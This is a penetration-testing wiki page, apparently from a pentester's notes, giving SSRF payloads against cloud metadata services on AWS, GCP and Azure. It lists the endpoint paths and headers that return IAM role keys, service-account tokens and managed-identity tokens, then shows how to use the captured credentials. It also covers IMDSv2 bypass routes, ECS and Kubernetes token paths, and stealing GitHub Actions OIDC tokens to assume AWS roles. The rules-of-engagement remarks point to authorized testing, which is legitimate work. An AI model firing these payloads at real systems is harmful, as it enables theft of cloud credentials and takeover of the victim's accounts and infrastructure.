---
title: "Payloads: Cloud Metadata (IMDS)"
type: payloads
tags: [payloads, ssrf, cloud, credentials]
sources: []
date_created: 2026-06-05
date_updated: 2026-11-11
---

# Payloads: Cloud Metadata (IMDS)

Endpoints to hit once SSRF reaches the metadata IP. Goal: cloud creds. See [[wiki/payloads/ssrf]], [[aws-metadata-ssrf]].

## AWS (169.254.169.254)
```
# IMDSv1
/latest/meta-data/iam/security-credentials/                 # -> role name
/latest/meta-data/iam/security-credentials/<role>           # -> AccessKey/Secret/Token
/latest/user-data                                           # often secrets
/latest/dynamic/instance-identity/document                  # account id, region
# IMDSv2 (token first)
PUT /latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)
GET ... (X-aws-ec2-metadata-token: <token>)
```

## GCP (metadata.google.internal) - header Metadata-Flavor: Google
```
/computeMetadata/v1/instance/service-accounts/default/token
/computeMetadata/v1/instance/service-accounts/default/email
/computeMetadata/v1/project/project-id
?recursive=true&alt=json
```

## Azure (169.254.169.254) - header Metadata: true
```
/metadata/instance?api-version=2021-02-01
/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
/metadata/identity/oauth2/token?...&resource=https://vault.azure.net
```

## Use captured creds
```
aws: export AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN -> aws sts get-caller-identity
gcp: gcloud auth activate / call APIs with bearer token
azure: az login --identity / call ARM with bearer
```
Record creds in `targets/<eng>/loot.md` (status unconfirmed until validated).

## NEW 2025-2026

1. **IMDSv2-is-default era (AWS)**: new EC2s enforce token+PUT; bypass surface
   moves to (a) hop-limit=1 escaping container sidecars, (b) proxies that forward
   PUT/token flows, (c) leaked role creds already outside IMDS. Token request
   first: `PUT /latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'`.
2. **Per-cloud ladders**: GCP requires `Metadata-Flavor: Google` (and rejects
   `X-Forwarded-For` - but try anyway); Azure IMDS `api-version` + Managed Identity
   `identity/identity?api-version=2018-02-01`; Alibaba `latest/meta-data/`.
3. **Metadata analogs beyond 169.254.169.254**: ECS task metadata 169.254.170.2
   (credentials JSON, no v2), Kubernetes serviceaccount tokens
   (`/var/run/secrets/.../token`) + kubelet 10250, GitHub Actions OIDC ->
   cloud role assumption (steal the OIDC token from the runner, exchange for AWS
   creds: `sts assume-role-with-web-identity`).
4. **Verification stays RoE-safe**: fetched creds get ONE identity call
   (`GetCallerIdentity` / Azure managed-identity list) - record scope, stop
   (see hunt-secrets ladder).
